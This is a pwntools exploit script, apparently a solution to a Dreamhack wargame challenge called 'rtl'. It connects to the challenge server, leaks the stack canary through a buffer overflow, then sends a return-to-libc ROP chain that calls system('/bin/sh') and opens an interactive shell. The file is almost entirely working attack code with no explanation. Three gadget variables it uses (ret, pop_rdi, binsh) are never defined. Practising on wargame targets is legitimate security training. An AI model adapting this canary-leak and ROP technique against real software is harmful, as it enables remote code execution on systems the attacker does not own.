from pwn import *

p = remote("host1.dreamhack.games", 19287)
e = ELF("./rtl")

def slog(name, addr): return success(": ".join([name, hex(addr)]))

# Canary
buf = b"A"*0x39
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b"\x00"+p.recvn(7))
slog("canary", cnry)

# Exploit
system_plt = e.plt["system"]
payload = b"A"*0x38 + p64(cnry) + b"B"*0x8
payload += p64(ret)

payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)
p.sendafter("Buf: ", payload)
p.interactive()
